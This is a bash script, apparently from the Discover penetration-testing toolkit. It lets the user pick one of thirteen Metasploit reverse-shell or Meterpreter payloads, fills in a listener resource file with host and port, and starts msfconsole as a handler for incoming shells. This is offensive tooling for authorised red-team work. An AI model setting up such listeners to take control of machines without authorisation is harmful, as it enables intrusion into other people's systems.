#!/usr/bin/env bash

# by Lee Baird (@discoverscripts)

clear
f_banner

echo -e "${BLUE}Metasploit Listeners${NC}"
echo
echo "1.   android/meterpreter/reverse_tcp"
echo "2.   cmd/windows/reverse_powershell"
echo "3.   java/jsp_shell_reverse_tcp"
echo "4.   linux/x64/meterpreter_reverse_https"
echo "5.   linux/x64/meterpreter_reverse_tcp"
echo "6.   linux/x64/shell/reverse_tcp"
echo "7.   osx/x64/meterpreter_reverse_https"
echo "8.   osx/x64/meterpreter_reverse_tcp"
echo "9.   php/meterpreter/reverse_tcp"
echo "10.  python/meterpreter_reverse_https"
echo "11.  python/meterpreter_reverse_tcp"
echo "12.  windows/x64/meterpreter_reverse_https"
echo "13.  windows/x64/meterpreter_reverse_tcp"
echo "14.  Previous menu"
echo
echo -n "Choice: "
read -r CHOICE
CHOICE="${CHOICE#"${CHOICE%%[![:space:]]*}"}"
CHOICE="${CHOICE%"${CHOICE##*[![:space:]]}"}"

case "$CHOICE" in
    1) PAYLOAD="android/meterpreter/reverse_tcp" ;;
    2) PAYLOAD="cmd/windows/reverse_powershell" ;;
    3) PAYLOAD="java/jsp_shell_reverse_tcp" ;;
    4) PAYLOAD="linux/x64/meterpreter_reverse_https" ;;
    5) PAYLOAD="linux/x64/meterpreter_reverse_tcp" ;;
    6) PAYLOAD="linux/x64/shell/reverse_tcp" ;;
    7) PAYLOAD="osx/x64/meterpreter_reverse_https" ;;
    8) PAYLOAD="osx/x64/meterpreter_reverse_tcp" ;;
    9) PAYLOAD="php/meterpreter/reverse_tcp" ;;
    10) PAYLOAD="python/meterpreter_reverse_https" ;;
    11) PAYLOAD="python/meterpreter_reverse_tcp" ;;
    12) PAYLOAD="windows/x64/meterpreter_reverse_https" ;;
    13) PAYLOAD="windows/x64/meterpreter_reverse_tcp" ;;
    14) exit 1 ;;
    *) f_invalid; exit 1 ;;
esac

echo
echo -n "LHOST: "
read -r LHOST

# Check for no answer
if [ -z "$LHOST" ]; then
    LHOST="$MYIP"
    echo "[*] Using $MYIP"
    echo
fi

echo -n "LPORT: "
read -r LPORT

# Check for no answer
if [ -z "$LPORT" ]; then
    LPORT=443
    echo "[*] Using 443"
fi

# Check for valid port number.
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [[ "$LPORT" -lt 1 || "$LPORT" -gt 65535 ]]; then
    f_invalid; exit 1
fi

# Check for root when binding to a low port
if [[ "$LPORT" -lt 1025 && "$(id -u)" != "0" ]]; then
    echo
    echo -e "${RED}$SMALL${NC}"
    echo
    echo -e "${RED}[!] You must be root to bind to a port below 1025.${NC}"
    echo
    echo -e "${RED}$SMALL${NC}"
    echo
    sleep 2
    exit 1
fi

if ! command -v msfconsole >/dev/null 2>&1; then
    echo
    echo -e "${RED}[!] msfconsole is not installed.${NC}"
    echo
    sleep 2
    exit 1
fi

LISTENER_RC="$HOME/data/listener.rc"
mkdir -p "$HOME/data"
cp "$DISCOVER"/resource/listener.rc "$LISTENER_RC"

sed -i "s|aaa|$PAYLOAD|g" "$LISTENER_RC"
sed -i "s/bbb/$LHOST/g" "$LISTENER_RC"
sed -i "s/ccc/$LPORT/g" "$LISTENER_RC"

if [ ! -f "$LISTENER_RC" ]; then
    echo
    echo -e "${RED}[!] Listener resource file was not created.${NC}"
    echo
    sleep 2
    exit 1
fi

echo
echo "[*] Starting listener: $PAYLOAD on $LHOST:$LPORT"
echo "[*] Metasploit database warnings can be ignored if the handler starts."
echo "[*] Press Ctrl+C or type 'exit' in msfconsole to stop."
echo
msfconsole -q -r "$LISTENER_RC"
exit 0
